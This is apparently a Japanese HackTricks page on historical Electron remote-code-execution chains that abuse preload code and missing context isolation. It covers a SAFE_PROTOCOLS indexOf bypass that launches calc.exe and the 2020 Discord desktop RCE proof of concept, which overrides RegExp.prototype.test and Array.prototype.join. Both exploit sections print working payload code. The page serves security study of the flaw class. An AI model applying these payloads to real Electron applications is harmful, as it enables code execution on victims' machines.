# Electron contextIsolation RCE via preload code

{{#include ../../banners/hacktricks-training.md}}

これらは、preload code が攻撃者に制御された renderer content と JavaScript の intrinsics または特権 API を共有していた**過去の攻撃チェーン**です。context isolation が有効な場合、preload とページは通常、別々の JavaScript realm を持つため、ページ内の prototype の上書きが preload のオブジェクトに自動的に影響することはありません。正確な Electron/application version と bridge implementation で、この攻撃チェーンが有効か確認してください。<sup>[[3]](#references)</sup>

## 例 1

[https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30) の例<sup>[[1]](#references)</sup>

このコードは http(s) link をデフォルトの browser で開きます。

![Electron contextIsolation RCE via preload code - 例 1: このコードは http(s) link をデフォルトの browser で開きます](<../../images/image (768).png>)

影響を受ける過去の application では、`file:///C:/Windows/System32/calc.exe` のようなローカルファイルへの navigation が OS の起動処理に到達する可能性がありました。`SAFE_PROTOCOLS.indexOf` はそれを防ぐことを意図していました。

そのため、攻撃者は XSS または任意のページ遷移を介して、次の JS code を注入できました。

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
```

`SAFE_PROTOCOLS.indexOf` の呼び出しは常に 1337 を返すため、攻撃者は保護を回避して calc を実行できます。最終的な exploit:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```

権限の確認を求めるプロンプトを表示せずにプログラムを実行する他の方法について、元のスライドを確認してください。<sup>[[1]](#references)</sup>

当時のDiscordのやり取りでは、UNC形式の `file://127.0.0.1/electron/rce.jar` の読み込みも、別の実行経路として検討されていました。正確なWindows/Electronのビルドで到達可能か検証してください。<sup>[[2]](#references)</sup>

## Example 2: Discord App RCE

[https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)からの例<sup>[[2]](#references)</sup>

preloadスクリプトを確認したところ、Discordが関数をWebページに公開しており、`DiscordNative.nativeModules.requireModule('MODULE-NAME')` を介して、許可された一部のモジュールを呼び出せることがわかりました。\
ここでは、_child_process_ モジュールのようにRCEに直接使用できるモジュールは使えませんでしたが、**JavaScriptの組み込みメソッドを上書きして**、公開されたモジュールの実行に干渉することでRCEを実現できるコードを**発見しました**。

以下がPoCです。devToolsから、**`RegExp.prototype.test` と `Array.prototype.join` を上書き**した状態で、"_discord_utils_" というモジュールで定義されている **`getGPUDriverVersions` 関数を呼び出す**と、**calc** アプリケーションが**起動する**ことを確認できました。

```javascript
RegExp.prototype.test = function () {
  return false
}
Array.prototype.join = function () {
  return "calc"
}
DiscordNative.nativeModules
  .requireModule("discord_utils")
  .getGPUDriverVersions()
```

`getGPUDriverVersions` 関数は、以下のように「_execa_」ライブラリを使用してプログラムを実行しようとします。

```javascript
module.exports.getGPUDriverVersions = async () => {
  if (process.platform !== "win32") {
    return {}
  }

  const result = {}
  const nvidiaSmiPath = `${process.env["ProgramW6432"]}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`

  try {
    result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []))
  } catch (e) {
    result.nvidia = { error: e.toString() }
  }

  return result
}
```

通常、_execa_ は `nvidiaSmiPath` 変数で指定された "_nvidia-smi.exe_" を実行しようとします。しかし、`RegExp.prototype.test` と `Array.prototype.join` が上書きされているため、**引数は _execa_ の内部処理で「_**calc**_」に置き換えられます**。

具体的には、過去の `cross-spawn` パーサーにおけるコマンド解決と引数処理の経路に影響を与えることで、引数が置き換えられます。<sup>[[4]](#references)</sup>

## References

- [1] [Electron: コンテキスト分離の欠如を悪用する - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)
- [2] [Discord Desktop app RCE](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)
- [3] [Electron — コンテキスト分離](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [4] [`node-cross-spawn` パーサーのリビジョンと、このチェーンで使用される正確なパス（36〜55行目）](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36-L55)
{{#include ../../banners/hacktricks-training.md}}
